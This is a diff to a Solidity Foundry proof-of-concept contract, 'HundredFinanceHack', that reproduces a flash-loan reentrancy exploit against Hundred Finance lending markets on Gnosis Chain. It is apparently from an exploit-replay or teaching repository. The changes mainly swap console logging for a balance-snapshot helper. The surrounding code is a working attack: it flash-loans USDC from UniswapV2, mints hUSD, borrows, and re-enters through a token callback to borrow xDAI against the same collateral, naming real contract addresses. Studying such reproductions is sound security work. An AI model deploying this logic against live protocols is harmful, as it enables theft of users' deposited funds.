@@ -3,11 +3,12 @@ pragma solidity ^0.8.0;
 import "../src/flashloan/FlashLoan.sol";
 import "../src/reentrancy/Reentrancy.sol";
 import "../src/tokens/Tokens.sol";
+import "../src/PoC.sol";
 
 import "forge-std/interfaces/IERC20.sol";
 import "forge-std/console.sol";
 
-contract HundredFinanceHack is FlashLoan, Reentrancy {
+contract HundredFinanceHack is FlashLoan, Reentrancy, PoC {
     // Hundred Finance Markets on Gnosis Chain
     IERC20 constant husd = IERC20(0x243E33aa7f6787154a8E59d3C27a66db3F8818ee);
     IERC20 constant hxdai = IERC20(0x090a00A2De0EA83DEf700B5e216f87a5D4F394FE);
@@ -18,8 +19,6 @@ contract HundredFinanceHack is FlashLoan, Reentrancy {
     uint256 totalFlashloaned;
 
     function initiateAttack() external {
-        console.log("USDC balance before:", GnosisTokens.USDC.balanceOf(address(this)));
-
         // Setup token pair and amounts to flash loan from UniswapV2
         address[] memory tokens = new address[](2);
         tokens[0] = address(GnosisTokens.USDC);
@@ -31,7 +30,6 @@ contract HundredFinanceHack is FlashLoan, Reentrancy {
         // Trigger the flash loan from the passed provider
         // This will call _executeAttack which has logic to determine if it's in the flash loan callback
         takeFlashLoan(FlashLoanProviders.UNISWAPV2, tokens, amounts);
-        console.log("USDC balance after:", GnosisTokens.USDC.balanceOf(address(this)));
     }
 
     function _executeAttack() internal override(FlashLoan, Reentrancy) {
@@ -50,9 +48,15 @@ contract HundredFinanceHack is FlashLoan, Reentrancy {
                 // we can reuse the collateral
                 ICompoundToken(address(hxdai)).borrow(amount);
             }
-        } else if (currentFlashLoanProvider() == FlashLoanProviders.UNISWAPV2) {
-            // Check that our current flash loan provider is Uniswap
-            console.log("USDC balance after flash loan:", GnosisTokens.USDC.balanceOf(address(this)));
+        }
+        // Check that our current flash loan provider is UniswapV2
+        else if (currentFlashLoanProvider() == FlashLoanProviders.UNISWAPV2) {
+            // Attacker USDC balance before borrow
+            console.log("Attacker USDC and xdai balances after flash loan");
+            IERC20[] memory tokens = new IERC20[](2);
+            tokens[0] = GnosisTokens.USDC;
+            tokens[1] = IERC20(address(0x0));
+            snapshotAndPrint(address(this), tokens);
 
             // Decode the parameters passed to the flash loan callback function, `uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data)`
             (, uint256 amount0, uint256 amount1,) = abi.decode(msg.data[4:], (address, uint256, uint256, bytes));
@@ -63,13 +67,20 @@ contract HundredFinanceHack is FlashLoan, Reentrancy {
             GnosisTokens.USDC.approve(address(husd), balance);
             ICompoundToken(address(husd)).mint(balance);
 
+            IERC20[] memory tokens2 = new IERC20[](2);
+            tokens2[0] = GnosisTokens.USDC;
+            tokens2[1] = husd;
+            console.log("Attacker USDC and hUSD balances after mint");
+            snapshotAndPrint(address(this), tokens2);
+
             // Borrow usdc agaist our minted husd
             // This triggers a token callback on our contract through the transfer of usdc
             uint256 amount = (totalFlashloaned * 90) / 100;
             ICompoundToken(address(husd)).borrow(amount);
 
-            console.log("Attacker USDC balance after borrow: %s USDC", GnosisTokens.USDC.balanceOf(address(this)));
-            console.log("Attacker xdai balance after borrow: %s XDAI", address(this).balance);
+            // Attacker USDC and xdai balances after borrow
+            console.log("Attacker USDC and xdai balances after borrow");
+            snapshotAndPrint(address(this), tokens);
         }
     }
 
@@ -78,8 +89,11 @@ contract HundredFinanceHack is FlashLoan, Reentrancy {
         IWETH(payable(address(wxdai))).deposit{value: address(this).balance}();
         wxdai.approve(address(curve), wxdai.balanceOf(address(this)));
         curve.exchange(0, 1, wxdai.balanceOf(address(this)), 1);
-        console.log("Attacker USDC balance after swap: %s USDC", GnosisTokens.USDC.balanceOf(address(this)));
-        console.log("Attacker xdai balance after swap: %s XDAI", address(this).balance);
+        console.log("Attacker USDC and xdai balance after swap");
+        IERC20[] memory tokens = new IERC20[](2);
+        tokens[0] = GnosisTokens.USDC;
+        tokens[1] = IERC20(address(0x0));
+        snapshotAndPrint(address(this), tokens);
     }
 
     // Our contract needs to implement this function to be able to receive Gnosis chain's native asset, xdai
